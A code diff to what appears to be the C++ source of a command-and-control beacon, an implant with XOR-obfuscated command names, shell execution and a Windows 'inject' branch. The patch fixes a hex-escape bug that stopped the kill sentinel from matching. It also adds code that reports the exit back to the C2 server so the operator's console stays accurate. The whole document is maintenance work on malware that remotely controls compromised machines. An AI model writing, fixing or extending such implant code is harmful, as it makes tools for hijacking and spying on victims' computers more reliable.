@@ -830,7 +830,11 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         return run_shell_command(shell_cmd);
     }
     else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
-        return "\x01\x02EX";
+        // Adjacent literals are REQUIRED: in "\x02EX" the hex escape is
+        // greedy and swallows the E (\x02E == 0x2E '.'), yielding a 3-byte
+        // string that never matched the 4-byte sentinel — the beacon
+        // ignored every kill and the task was redelivered for ever.
+        return "\x01\x02" "EX";
     }
     else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
 #ifdef _WIN32
@@ -1472,6 +1476,11 @@ extern "C" void beacon_main(int argc, char** argv) {
                 std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
                 if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                     if (output[2] == 'E' && output[3] == 'X') {
+                        // Exit acknowledgment (best effort): the server acks
+                        // the kill task and marks the beacon "exited" so the
+                        // operator does not see a stale ACTIVE entry. A dead
+                        // link must not keep the implant alive — exit anyway.
+                        net::send_result(cfg, task.task_id, output);
                         alive = false;
                         break;
                     }
